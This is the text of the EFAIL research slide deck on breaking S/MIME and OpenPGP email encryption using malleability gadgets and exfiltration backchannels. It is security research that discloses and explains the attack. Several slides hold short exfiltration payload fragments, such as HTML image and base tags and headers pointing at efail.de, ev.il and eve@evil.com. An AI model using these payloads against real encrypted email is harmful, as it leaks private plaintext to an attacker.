<?xml version="1.0" ?>
<Presentation>
  <div class="page">
    <p>EFAIL B R EA K I N G S / M I M E A N D O P E N P G P E M A I L E N C RY PT I O N U S I N G E X F I LT R AT I O N C H A N N E L S</p>
    <p>Damian Poddebniak1, Christian Dresen1, Jens Mller2, Fabian Ising1, Sebastian Schinzel1, Simon Friedberger3, Juraj Somorovsky2, Jrg Schwenk2</p>
    <p>mail@efail.de | https://www.efail.de</p>
  </div>
  <div class="page">
    <p>Nation state attackers</p>
    <p>Massive collection of emails</p>
    <p>Snowden revelations on pervasive surveillance</p>
    <p>Breach of email provider / email account</p>
    <p>Single point of failure</p>
    <p>Arent they reading / analyzing my emails anyway?</p>
    <p>Insecure transport  TLS might be used  we dont know in advance!</p>
    <p>Motivation for email encryption</p>
  </div>
  <div class="page">
    <p>OpenPGP (RFC 4880)</p>
    <p>Favored by privacy advocates</p>
    <p>Web-of-trust (no authorities)</p>
    <p>S/MIME (RFC 5751)</p>
    <p>Favored by organizations</p>
    <p>Multi root trust hierarchies</p>
    <p>Email e2e encryption TWO COMPETING STANDARDS</p>
  </div>
  <div class="page">
    <p>Security of email encryption</p>
    <p>?</p>
    <p>Request/response protocols Email is non-interactive</p>
  </div>
  <div class="page">
    <p>Forcing an email client to send responses via backchannels</p>
    <p>HTML/CSS</p>
    <p>Email header</p>
    <p>Attachment preview</p>
    <p>Certificate verification</p>
    <p>Backchannel techniques</p>
    <p>&lt;img src=&quot;http://efail.de&quot;&gt; &lt;object data=&quot;ftp://efail.de&quot;&gt; &lt;style&gt;@import '//efail.de'&lt;/style&gt; ...</p>
    <p>Disposition-Notification-To: eve@evil.com Remote-Attachment-URL: http://efail.de X-Image-URL: http://efail.de  OCSP, CRL, intermediate certs PDF, SVG, VCards, etc.</p>
  </div>
  <div class="page">
    <p>Windows</p>
    <p>Linux</p>
    <p>macOS</p>
    <p>iOS</p>
    <p>Android</p>
    <p>Webmail</p>
    <p>Webapp</p>
    <p>Outlook IBM Notes</p>
    <p>Postbox Foxmail</p>
    <p>Live Mail Pegasus</p>
    <p>The Bat! Mulberry</p>
    <p>eM Client</p>
    <p>Thunderbird</p>
    <p>Evolution KMail Trojit</p>
    <p>Claws Mutt</p>
    <p>Apple Mail Airmail MailMate</p>
    <p>Mail App CanaryMail Outlook</p>
    <p>K-9 Mail R2Mail</p>
    <p>MailDroid Nine</p>
    <p>GMail Outlook.com</p>
    <p>Yahoo! iCloud</p>
    <p>GMX HushMail</p>
    <p>Mail.ru FastMail</p>
    <p>Roundcube</p>
    <p>RainLoop AfterLogic Horde IMP</p>
    <p>ProtonMail Mailfence</p>
    <p>Mailbox ZoHo Mail</p>
    <p>No user interaction</p>
    <p>User interaction</p>
    <p>Leak via bypass</p>
    <p>W8Mail W10MailWLMail</p>
    <p>Mailpile</p>
    <p>Exchange GroupWise</p>
    <p>Evaluation of backchannels in email clients</p>
    <p>Javascript execution</p>
    <p>no user interaction</p>
  </div>
  <div class="page">
    <p>Attacker model</p>
  </div>
  <div class="page">
    <p>S/MIME</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>C1</p>
    <p>P0</p>
    <p>decryption</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>C1</p>
    <p>P0</p>
    <p>decryption</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>C1</p>
    <p>P0</p>
    <p>decryption</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>C1</p>
    <p>P0</p>
    <p>decryption</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>C1</p>
    <p>P0</p>
    <p>decryption</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>C1</p>
    <p>P0</p>
    <p>decryption</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>C1</p>
    <p>P0</p>
    <p>decryption</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>C1</p>
    <p>P0</p>
    <p>decryption</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>C1</p>
    <p>P0</p>
    <p>decryption</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>Content-type: te</p>
    <p>C1</p>
    <p>P0</p>
    <p>decryption</p>
    <p>xt/html\nDear Bob</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>Zontent-type: te</p>
    <p>C1</p>
    <p>P0'</p>
    <p>decryption</p>
    <p>xt/html\nDear Bob</p>
    <p>C2</p>
    <p>P1</p>
    <p>C0'</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>C0  P0</p>
    <p>decryption</p>
    <p>C1</p>
    <p>P0'</p>
    <p>decryption</p>
    <p>xt/html\nDear Bob</p>
    <p>C2</p>
    <p>P1 CBC Gadget</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>C0  P0  Pc</p>
    <p>decryption</p>
    <p>&lt;img src=ev.il/</p>
    <p>C1</p>
    <p>P0'</p>
    <p>decryption</p>
    <p>xt/html\nDear Bob</p>
    <p>C2</p>
    <p>P1</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>Content-type: te</p>
    <p>C1'</p>
    <p>P0'</p>
    <p>decryption</p>
    <p>Zt/html\nDear Bob</p>
    <p>C2</p>
    <p>P1'</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Malleability of CBC</p>
    <p>decryption</p>
    <p>????????????????</p>
    <p>C1'</p>
    <p>P0'</p>
    <p>decryption</p>
    <p>Zt/html\nDear Bob</p>
    <p>C2</p>
    <p>P1'</p>
    <p>C0</p>
  </div>
  <div class="page">
    <p>Attacking S/MIME</p>
    <p>No MAC</p>
  </div>
  <div class="page">
    <p>Attacking S/MIME PRACTICAL ATTACK AGAINST S/MIME</p>
    <p>???????????????? &lt;base &quot;</p>
    <p>???????????????? &lt;img &quot;</p>
    <p>???????????????? &quot; href=&quot;http:&quot;&gt;</p>
    <p>Content-type: te xt/html\nDear Sir or Madam, the se ecret meeting wi</p>
    <p>???????????????? &quot; src=&quot;efail.de/</p>
    <p>Content-type: te xt/html\nDear Sir or Madam, the se ecret meeting wi</p>
    <p>???????????????? &quot;&gt;</p>
    <p>Original</p>
    <p>Crafted</p>
    <p>Changing Duplicating Reordering</p>
  </div>
  <div class="page">
    <p>Practical attack against S/MIME ATTACKER MODEL</p>
  </div>
  <div class="page">
    <p>OpenPGP</p>
  </div>
  <div class="page">
    <p>OpenPGP uses a variation of CFB-Mode</p>
    <p>OpenPGP defines primitives for integrity protection</p>
    <p>Plaintext compression is enabled by default</p>
    <p>Attacking OpenPGP DIFFERENCES TO S/MIME</p>
    <p>Ci</p>
    <p>Pi (known)</p>
    <p>Ci+1</p>
    <p>Pi-1</p>
    <p>encryption encryption</p>
    <p>XCi</p>
    <p>encryption</p>
    <p>Pc (chosen) random plaintext ? ? ? ? ? ? ? ?</p>
    <p>encryption</p>
  </div>
  <div class="page">
    <p>Attacking OpenPGP DEFEATING INTEGRITY PROTECTION</p>
    <p>Vulnerable Not Vulnerable</p>
    <p>Client Plugin (up to version) MDC Stripped MDC Incorrect SEIP -&gt; SE</p>
    <p>Outlook 2007 GPG4WIN 3.0.0</p>
    <p>Outlook 2010 GPG4WIN</p>
    <p>Outlook 2013 GPG4WIN</p>
    <p>Outlook 2016 GPG4WIN</p>
    <p>Thunderbird Enigmail 1.9.9</p>
    <p>Apple Mail (OSX) GPGTools 2018.01</p>
    <p>MDC stripped MDC incorrect SEIP -&gt; SE</p>
  </div>
  <div class="page">
    <p>Attacking OpenPGP RFC 4880 ON MODIFICATION DETECTION CODES</p>
  </div>
  <div class="page">
    <p>Challenge: create chosen compressed plaintext</p>
    <p>We present a solution for this in the paper</p>
    <p>In a nutshell:  Our shortest exploit needs 11 bytes of known plaintext</p>
    <p>The first 4 bytes are known header data</p>
    <p>Remaining 7 bytes have to be guessed</p>
    <p>OpenPGP COMPRESSION (DEFLATE)</p>
    <p>? ? ? ? ? ? ?</p>
  </div>
  <div class="page">
    <p>PGP-encrypted Facebook password recovery  211 guesses to break every email</p>
    <p>PGP-encrypted Enron dataset  500 guesses to break 41% of the emails</p>
    <p>Multiple guesses per email possible  Up to 1.000 MIME parts per email</p>
    <p>OpenPGP GUESSING BYTES IN COMPRESSION</p>
  </div>
  <div class="page"/>
  <div class="page">
    <p>S/MIME standard draft - draft-ietf-lamps-rfc5751-bis-11</p>
    <p>References EFAIL paper</p>
    <p>Recommends usage of authenticated encryption</p>
    <p>OpenPGP standard draft - draft-ietf-openpgp-rfc4880bis-05</p>
    <p>Deprecates Symmetrically Encrypted (SE) data packets (due to downgrade attack)</p>
    <p>Proposes chunk size limits for AEAD protected data packets</p>
    <p>Implementations should not allow users to access modified plaintexts</p>
    <p>Impact on the standards CURRENT DRAFTS</p>
  </div>
  <div class="page">
    <p>Introduced malleability gadgets</p>
    <p>Self-exfiltrating plaintexts</p>
    <p>Evaluation of backchannels</p>
    <p>Crypto standards need to evolve  Current S/MIME is broken</p>
    <p>OpenPGP needs clarification</p>
    <p>Secure HTML email is challenging</p>
    <p>Conclusions</p>
    <p>Thank you! Questions?</p>
    <p>https://www.efail.de/</p>
  </div>
</Presentation>
